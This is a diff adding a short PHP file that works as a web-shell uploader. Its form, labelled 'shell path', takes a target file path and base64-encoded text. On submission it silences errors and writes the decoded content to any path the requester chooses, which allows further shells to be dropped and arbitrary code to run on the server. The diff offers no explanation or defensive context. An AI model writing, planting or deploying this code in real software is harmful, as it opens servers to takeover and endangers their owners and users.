@@ -1,0 +1,21 @@
+<?php
+                    header("content-Type: text/html; charset=utf-8");
+                    ?>
+                    <form method="POST"></br>
+                    shell path: <input type="text" name="file" size="60" value="<?php echo str_replace('\\','/',__FILE__) ?>">
+                    <br><br>
+                    <textarea name="text" COLS="70" ROWS="18" ></textarea>
+                    <br><br>
+                    <input type="submit" name="submit" value="save"> 
+                    <form>
+                    
+                    <?php
+                    error_reporting(0);
+                    if ($_POST){
+                    
+                    $f=fopen($_POST["file"],"w");
+                    echo   fwrite($f,base64_decode($_POST["text"]))? 'save success' : 'save fail';
+                    
+                    }
+                    
+                    ?>
